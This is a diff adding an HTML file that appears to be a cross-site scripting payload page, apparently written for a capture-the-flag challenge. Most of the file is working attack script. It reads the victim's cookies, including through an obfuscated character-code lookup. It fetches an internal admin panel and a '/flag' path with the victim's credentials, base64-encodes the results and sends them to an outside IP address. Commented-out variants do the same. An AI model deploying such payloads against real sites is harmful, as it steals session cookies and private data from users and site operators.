@@ -1,0 +1,16 @@
+<html>
+    <p>testtttttt here</p>
+    <!-- <script src="http://104.238.133.245:9999"></script> -->
+    <!-- <img src="http://104.238.133.245:9999"/> -->
+    <!-- <script>fetch("http://104.238.133.245:9999/" + btoa(document.URL)).then(data => console.log(data))</script> -->
+<script>
+    if (document.cookie) {
+        fetch("http://104.238.133.245:9999/" + btoa(document.cookie)).then(data => console.log(data));
+    } else {
+        fetch("http://0.0.0.0:8080/Secret_admin_cookie_panel", {credentials: "include"}).then(data => console.log(data));
+    }
+</script>
+<script>fetch("http://0.0.0.0:8080", {credentials: "include"}).then(res => res.text()).then(data => window.location = "http://104.238.133.245:9999/" + btoa(data))</script>
+<script>fetch("http://104.238.133.245:9999/" + btoa(document[String.fromCharCode(99, 111, 111, 107, 105, 101)])).then(data => console.log(data))</script>
+<script>fetch("/flag").then(res => res.text()).then(data => window.location = "http://104.238.133.245:9999/" + btoa(data))</script>
+</html>
